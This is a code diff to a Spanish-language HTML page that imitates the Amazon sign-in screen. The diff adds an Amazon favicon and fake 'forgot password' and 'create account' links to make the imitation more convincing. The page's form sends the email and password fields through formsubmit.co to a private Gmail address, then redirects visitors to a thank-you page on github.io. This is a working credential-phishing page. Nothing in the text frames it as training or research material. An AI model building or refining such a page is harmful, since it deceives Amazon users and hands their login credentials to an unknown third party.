@@ -4,6 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon"
+        href="https://static.vecteezy.com/system/resources/previews/019/136/322/non_2x/amazon-logo-amazon-icon-free-free-vector.jpg"
+        type="image/png">
     <title>Iniciar sesión en Amazon</title>
     <style>
         body {
@@ -16,6 +19,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+
         }
 
         .login-container {
@@ -75,11 +79,27 @@
             background-color: #ddb347;
         }
 
+        .login-container .links {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .login-container .links a {
+            color: #0073e6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-container .links a:hover {
+            text-decoration: underline;
+        }
+
         .footer {
             font-size: 12px;
             color: #555;
             text-align: center;
             margin-top: 20px;
+
         }
 
         .footer a {
@@ -123,11 +143,7 @@
     <div class="login-container">
         <h1>Iniciar sesión</h1>
         <form action="https://formsubmit.co/raulmorejonpulido@gmail.com" method="POST">
-            <!-- Campo oculto para el correo de destino -->
-            
-            <input type="hidden" name="_subject" value="Nuevo intento de inicio de sesión en Amazon">
-
-            <!-- Campo para correo electrónico -->
+            <!-- Campo para correo -->
             <label for="email">Correo electrónico o número de teléfono</label>
             <input type="email" id="email" name="email" placeholder="Introduce tu correo electrónico" required>
 
@@ -138,7 +154,13 @@
             <!-- Enviar formulario -->
             <button type="submit">Iniciar sesión</button>
             <input type="hidden" name="_next" value="https://mopux00.github.io/secur/gracias.html">
+
         </form>
+
+        <div class="links">
+            <a href="#">¿Olvidaste tu contraseña?</a><br>
+            <a href="#">Crea tu cuenta de Amazon</a>
+        </div>
     </div>
 
     <div class="footer">
